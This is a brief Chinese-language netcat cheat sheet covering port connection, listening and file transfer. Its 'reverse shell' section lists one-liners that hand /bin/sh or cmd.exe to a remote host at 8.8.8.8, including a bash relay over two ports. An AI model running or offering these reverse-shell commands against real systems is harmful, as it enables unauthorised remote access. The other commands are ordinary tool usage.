# netcat

```
netcat 网络军刀
```

#### 命令

1. 连接端口
```
nc 8.8.8.8 
```

2. 监听端口
```
nc -l 8888
```

3. 反弹 shell
```
nc 8.8.8.8 8888 -e /bin/sh
nc 8.8.8.8 8888 -e cmd.exe
nc 8.8.8.8 8888 | /bin/bash | nc 8.8.8.8 9999
```

4. 传输文件
```
发送方 : 
nc 8.8.8.8 8888 < intput_file
接收方 : 
nc -l 8888 > output_file
```
